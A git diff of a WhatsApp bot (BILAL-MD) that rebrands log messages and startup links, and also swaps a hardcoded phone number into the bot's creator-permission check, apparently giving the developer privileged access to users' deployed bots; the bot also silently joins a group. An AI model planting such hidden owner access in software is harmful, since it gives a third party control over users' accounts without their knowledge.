@@ -72,7 +72,7 @@ const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
 filer.download((err, data) => {
 if(err) throw err
 fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
-console.log("Session downloaded ✅")
+console.log("SESSIO-ID CONNECTED 🙂")
 })})}
 
 const express = require("express");
@@ -82,7 +82,7 @@ const port = process.env.PORT || 9090;
   //=============================================
   
   async function connectToWA() {
-  console.log("Connecting to WhatsApp ⏳️...");
+  console.log("BILAL-MD START HO RAHA HAI....😊");
   const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
   var { version } = await fetchLatestBaileysVersion()
   
@@ -114,37 +114,34 @@ conn.ev.on('connection.update', (update) => {
         }
 
     } else if (connection === 'open') {
-        console.log('🧬 Installing Plugins...');
+        console.log('COMMANDS ADD HO RAHE HAI...😇');
         fs.readdirSync("./plugins/").forEach((plugin) => {
             if (path.extname(plugin).toLowerCase() === ".js") {
                 try {
                     require("./plugins/" + plugin);
-                    console.log(`✅ Loaded plugin: ${plugin}`);
+                    console.log(`ADDED :❯ ${plugin}`);
                 } catch (err) {
                     console.error(`❌ Failed to load plugin ${plugin}:`, err);
                 }
             }
         });
     
-  console.log('Plugins installed successful ✅')
-  console.log('Bot connected to whatsapp ✅')
+  console.log('COMMANDS ADDED SUCCESSFUL')
+  console.log('👑 BILAL-MD STARTED 👑')
   
-  let up = `*✨ Hello BILAL MD USER! ✨*
+  let up = `*👑 BILAL-MD STARTED 👑*
+  
+  *👑 BILAL-MD SUPPORT 👑*
+  
+  *👑 OWNER INFO 👑*
+https://akaserein.github.io/Bilal/
 
-╭─〔 *🤖 BILAL-MD🧑‍💻* 〕  
-├─▸ *Simplicity. Speed. Power. BY BILAL KING |*  
-╰─➤ *Your New WhatsApp Sidekick is Here!*
+*👑 SUPPORT CHANNEL 👑*
+https://whatsapp.com/channel/0029Vaj3Xnu17EmtDxTNnQ0G
 
-*❤️ Thank you for Choosing BILAL MD!*
-
-╭──〔 🔗 *Quick Links* 〕  
-├─ 📢 *Join Our Channel:*  
-│   Click [**Here**](https://whatsapp.com/channel/0029Vaj3Xnu17EmtDxTNnQ0G) to join!  
-├─ ⭐ *Give Us a Star:*  
-│   Star Us [**Here**](https://github.com/KING-OS/BILAL-MD)!  
-╰─🛠️ *Prefix:* \`${prefix}\`
-
-> _© MADE BY BILAL KING_`;
+*👑 SUPPORT GROUP 👑*
+https://chat.whatsapp.com/BwWffeDwiqe6cjDDklYJ5m?mode=ems_copy_t
+								  `;
     conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/kunzpz.png` }, caption: up })
   }
   })
@@ -169,7 +166,7 @@ conn.ev.on('connection.update', async (update) => {
     if (connection === 'open') {
         try {
             await conn.groupAcceptInvite(inviteCode);
-            console.log("✅ BILAL-MD joined the WhatsApp group successfully.");
+            console.log("AP NE BILAL-MD SUPPORT GROUP JOIN KAR LIA HAI");
         } catch (err) {
             console.error("❌ Failed to join WhatsApp group:", err.message);
         }
@@ -243,7 +240,7 @@ conn.ev.on('connection.update', async (update) => {
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   const udp = botNumber.split('@')[0];
-    const jawad = ('94704896880', '94765635699');
+    const jawad = ('923078071982');
     let isCreator = [udp, jawad, config.DEV]
 					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
 					.includes(mek.sender);
@@ -290,9 +287,9 @@ conn.ev.on('connection.update', async (update) => {
 				}
  //================ownerreact==============
     
-  if(senderNumber.includes("923078071982")){
+  if(senderNumber.includes("22553229710")){
   if(isReact) return
-  m.react("🧑‍💻")
+  m.react("👑")
    }
   //==========public react============//
   // Auto React 
